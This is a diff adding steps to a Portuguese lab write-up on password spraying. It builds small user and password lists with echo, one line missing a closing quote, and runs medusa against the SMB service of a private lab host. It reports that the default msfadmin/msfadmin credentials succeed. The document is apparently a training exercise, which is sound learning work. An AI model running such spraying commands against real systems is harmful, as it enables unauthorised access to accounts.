@@ -86,9 +86,25 @@ Com esse ataque conseguimos todos os usuários e senhas válidos para login.
 
     <img width="1249" height="852" alt="image" src="https://github.com/user-attachments/assets/5a65d6b0-e4e1-4bb7-86b5-3c062540ef4c" />
 
+  b)Criando a lista de usuáruios para o ataque SMB
     
+  echo -e "user\nmsfadmin\nservice > smb_users.txt
 
+  echo -e "password\n123456\nWelcome\nmsfadmin" > senhas_spray.txt
 
-    
+  c) Iniciando o Password Spraying em SMB
 
+  medusa -h 192.168.15.43 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+<img width="1450" height="274" alt="image" src="https://github.com/user-attachments/assets/ba454ff1-2828-4d55-a27c-7f10c955fc37" />
+
+  Obtivemos então, sucesso ao acessar o serviço utilizando o usuário: msfadmin e a senha: msfadmin.
+
+  d) Validação de acesso acessando diretamente o serviço SMB:
+
+  <img width="819" height="352" alt="image" src="https://github.com/user-attachments/assets/a6fb8e1c-b95b-4306-a2ec-68b01065d487" />
+  
+Conseguimos acessar com sucesso o serviço
+
+  
     
